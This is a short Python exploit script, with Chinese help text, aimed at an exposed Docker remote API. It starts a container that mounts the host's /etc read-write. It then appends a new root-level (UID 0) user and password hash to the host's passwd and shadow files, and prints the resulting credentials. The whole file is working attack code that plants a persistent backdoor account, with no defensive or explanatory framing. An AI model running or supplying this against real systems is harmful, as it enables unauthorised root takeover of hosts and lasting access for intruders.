import docker
import random
import string
import argparse
import passlib.hash

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="目标URL (e.g. http://127.0.0.1:2375)", required=True)
    parser.add_argument("-u", "--user", help="用户名称", required=True)
    parser.add_argument("-p", "--passwd", help="用户密码", required=True)
    parser.add_argument("-i", "--image", help="Docker镜像 (default: alpine:latest)", default="alpine:latest")
    args = parser.parse_args()

    client = docker.DockerClient(base_url=args.target)
    client.containers.run(args.image, f'''sh -c "echo '{args.user}:x:0:0:{args.user}:/:/bin/sh' >> /tmp/etc/passwd && echo '{args.user}:{passlib.hash.md5_crypt.hash(args.passwd, salt="".join(random.sample(string.ascii_letters + string.digits, 8)))}::0:99999:7:::' >> /tmp/etc/shadow"''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})

    print(f"\033[92m[+] {args.target} {args.user}:{args.passwd} \033[0m")